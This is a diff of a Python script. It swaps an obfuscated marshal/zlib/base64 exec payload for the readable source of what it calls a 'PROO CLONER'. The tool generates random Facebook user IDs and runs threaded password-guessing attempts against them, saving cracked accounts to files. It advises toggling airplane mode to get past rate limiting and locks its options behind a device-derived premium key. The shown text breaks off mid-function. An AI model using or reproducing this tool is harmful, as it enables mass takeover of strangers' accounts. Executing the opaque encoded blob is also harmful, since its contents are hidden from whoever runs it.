@@ -1,3 +1,531 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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"))))
+W = '\033[97;1m' 
+R = '\033[91;1m' 
+G = '\033[92;1m' 
+Y = '\033[93;1m' 
+B = '\033[94;1m'
+P = '\033[95;1m'
+C = '\033[96;1m'
+N = '\x1b[0m'
+
+
+
+import os
+try:
+	import requests
+except ImportError:
+	os.system("pip install requests")
+
+try:
+	import concurrent.futures
+except ImportError:
+	os.system("pip install futures")
+
+import os
+import sys
+import time
+import requests
+import random
+import platform
+import base64
+import subprocess
+from concurrent.futures import ThreadPoolExecutor
+
+
+def runtxt(z):
+    for e in z + "\n":
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+
+def helpnote():
+	print("%s [*] FOLLOW ME ON Fb TU KNOW ABOUT UPDATES  :)"%(G))
+	subprocess.check_output(["am", "start", "https://github.com/HemtKhan/2007clone/blob/main/public.txt"])
+	exit(" [*] FACEBOOK :  https://www.facebook.com/irfan.7732")
+
+
+def notice():
+
+ 
+
+	runtxt("\n\033[0;91m🧞‍♀️YOU ARE NOT PREMIUM USER ")
+	runtxt("\033[0;93m 🔇 SENT THIS KEY TO ADMIN >> %s%s"%(G,basesplit))
+	runtxt("\033[0;92m ADMIN🧞‍♀️ telegram 🤲https://t.me/HemtHack")
+	subprocess.check_output(["am", "start", "https://t.me/HemtHack"])
+
+def irfan():
+	
+	
+	runtxt("\n\033[0;91m🧞‍This tool is Under maintenance break ")
+	runtxt("\n\033[0;91m🧞‍So wait For Update ")
+        
+	
+	
+plist = (platform.uname())[2]
+basex = plist
+basex1 = basex.encode('ascii')
+basex2 = base64.b64encode(basex1)
+basex3 = basex2.decode('ascii')
+base4 = (basex3).upper()
+basesplit = base4.replace('=', 'X').replace('A', '3').replace('B', '9').replace('C', '7').replace('D', '1').replace('E', '4').replace('M', '2').replace('L', '6').replace('F', '8').replace('N', 'E').replace('T', '8')
+
+
+class Main:
+	def __init__(self):
+		self.id = []
+		self.ok = []
+		self.cp = []
+		self.loop = 0
+		try:
+			plr = requests.get('https://raw.githubusercontent.com/HemtKhan/2007clone/main/public.txt').text
+			if basesplit in plr:
+				key = basesplit
+				stat = ("\033[0;92mPREMIUM")
+				FY = '\033[0;93m'
+				FG = '\033[0;92m'
+				GET = '\r'
+			else:
+				key = ("\033[0;91m -")
+				stat = ("\033[0;91mFREE USER")
+				FY = '\033[0;90m'
+				FG = '\033[0;90m'
+				GET = '\033[0;92m [P] GET PREMIUM'
+		except requests.exceptions.ConnectionError:
+			print("\n%s [!] NO INTERNET CONNECTION..\n"%(G))
+			exit()
+		os.system("clear")
+		
+		print ("""
+\033[1;32m  ::::::::      :::     ::::    ::::  :::::::::: :::::::::: :::::::::  
+:+:    :+:   :+: :+:   +:+:+: :+:+:+ :+:        :+:        :+:    :+: 
++:+         +:+   +:+  +:+ +:+:+ +:+ +:+        +:+        +:+    +:+ 
++#++:++#++ +#++:++#++: +#+  +:+  +#+ +#++:++#   +#++:++#   +#++:++#:  
+       +#+ +#+     +#+ +#+       +#+ +#+        +#+        +#+    +#+ 
+#+#    #+# #+#     #+# #+#       #+# #+#        #+#        #+#    #+# 
+ ########  ###     ### ###       ### ########## ########## ###    ### 
+                                                                      
+                                                                      
+                                                                      
+                                                                      
+                                                                      
+                                                                      
+                                                                      
+\033[1;35m
+\033[1;34m 
+\033[1;36m
+\033[1;33m
+\033[1;35m
+\033[41m\033[1;37m[HEMAT]   [RAYES KHALID]   [RAYES OMID]   [JALALZAI]\x1b[0m
+\033[1;32m┌───────────────────────────────────────┐
+\033[1;33m│ [✓] AUTHOR   : SAMEER\033[1;32m[KHAN]         │
+\033[1;34m│ [✓] GITHUB   : \033[41m\033[1;37mTEAM SAMEERKING1648 \x1b[0m           │
+\033[1;35m│ [✓] TELEGRAM :  SAMEER KHAN           │
+\033[1;36m│ [✓] POWER KHAN : \x1b[1;32mPRO PRONOY\x1b[1;97m           │
+\033[1;32m└───────────────────────────────────────┘  
+         \033[41m\033[1;37m𝐓𝐎𝐎𝐋 𝐀𝐃𝐌𝐈𝐍 𝐻𝐸𝑀𝐴𝑇 𝑈𝐿𝐿𝐴𝐻 𝐽𝐴𝐿𝐴𝐿𝑍𝐴𝐼\x1b[0m    
+ """)
+		print("%s [%s•%s] %sTOOL NAME : %sSAMEER ❌ PROO CLONER❌"%(G,R,G,B,G))
+		print("%s [%s•%s] %sVERSION   : %s2.0"%(G,R,G,B,G))
+		print("%s [%s•%s] %sYOUR KEY  : %s%s"%(G,R,G,B,G,key))
+		print("%s [%s•%s] %sSTATUS    : %s"%(G,R,G,B,stat)) 
+		print("")
+		print("%s [%s1%s]%s CRACK RANDOM FB ID 2012-15 %s(Free)"%(R,G,R,Y,G))
+		print("%s [%s2%s]%s CRACK RANDOM FB ID 2011-13 %s(Free)"%(R,G,R,Y,G))
+		print("%s [%s3%s]%s CRACK RANDOM FB ID 2008-11 %s(Free)"%(R,G,R,Y,G))
+		print("%s [%s4%s]%s CRACK RANDOM FB ID 2009    %s(Free)"%(R,G,R,Y,G))
+		print("%s [%s5%s]%s CRACK RANDOM FB ID 2005-7 %s(Free) "%(R,G,R,Y,G))
+		print("%s [%s6%s]%s CRACK RANDOM FB ID 2004-6 %s(Free) "%(R,G,R,Y,G))
+		print("%s [%s7%s]%s CRACK RANDOM FB ID 2004-5 %s(Free) "%(R,G,R,Y,G))
+		print("%s [%s8%s]%s CRACK RANDOM FB ID 2003-4 %s(Free) "%(R,G,R,Y,G))
+		print("%s [%s9%s]%s CRACK FROM EMAILS %s(Free)"%(R,G,R,Y,G))
+		print(GET)
+		hoga = input("\n%s [?] CHOICE : "%(B))
+		if hoga in ["", " "]:
+			Main()
+		elif hoga in ["1", "01"]:
+			if basesplit in plr:
+				self.old_11()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["2", "02"]:
+			if basesplit in plr:
+				self.old_11()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["3", "03"]:
+			if basesplit in plr:
+				self.shanto9()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["4", "04"]:
+			if basesplit in plr:
+				self.oldcrack()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["5", "05"]:
+			if basesplit in plr:
+				self.old4_7()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["6", "06"]:
+			if basesplit in plr:
+				self.old4_6()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["7", "07"]:
+			if basesplit in plr:
+				self.old4_5()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["8", "08"]:
+			if basesplit in plr:
+				self.shanto4()
+			else: 
+				irfan()
+				exit()
+		elif hoga in ["9", "09"]:
+			if basesplit in plr:
+				self.email()
+			else: 
+				notice()
+				exit()
+		elif hoga in ["10","১০"]:
+			if basesplit in plr:
+				self.oldcrack()
+			else:
+				notice()
+				exit()
+		elif hoga in ["P", "p"]:
+			notice()
+			exit()
+		else:
+			Main()
+
+	def shanto9(self):
+		x = 111111111
+		xx = 999999999
+		idx = "100000"
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
+	def shanto4(self):
+		x = 1111111
+		xx = 9999999
+		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(50000 MAX): \033[0;92m"))
+		if (limit)>50000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+		
+		
+	def old4_7(self):
+		x = 11111111
+		xx = 99999999
+		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
+		if (limit)>10000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G))
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(R))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+
+
+	def old4_6(self):
+		x = 1111111
+		xx = 9999999
+		#idx = input("%s [+] ENTER A DIGIT (1-9): %s"%(Y,G))
+		idx = random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9"])
+		limit = int(input("\033[0;92m [+] ENTER LIMIT \033[0;91m(10000 MAX): \033[0;92m"))
+		if (limit)>10000:
+			exit("\n%s [!] DON'T CROSS THE LIMIT BRO :)"%(R))
+		try:
+			for n in range(limit):
+				_ = random.randint(x,xx)
+				__ = idx
+				self.id.append(__+str(_))
+			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
+			with ThreadPoolExecutor(max_workers=30) as coeg:
+				print("\n%s [!] USE %s, %s(COMMA)%s FOR SEPARATOR "%(Y,G,B,Y))
+				print("%s EXAMPLE : %s123456,1234567,123456789"%(Y,G)) 
+				listpass = input("%s [?] ENTER PASSWORD :%s "%(Y,G))
+				if len(listpass)<=5:
+					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(R))
+				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(Y,listpass))
+				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(G))
+				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(Y))
+				print("%s [!] IF NO RESULT TURN ON AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(R))
+				for user in self.id:
+					coeg.submit(self.api, user, listpass.split(","))
+			exit("\n\n%s [#] CRACK COMPLETE..."%(G))
+		except Exception as e:exit(str(e))
+		
+		
+	def old4_5(self):
+		x = 111111
+		xx = 999999
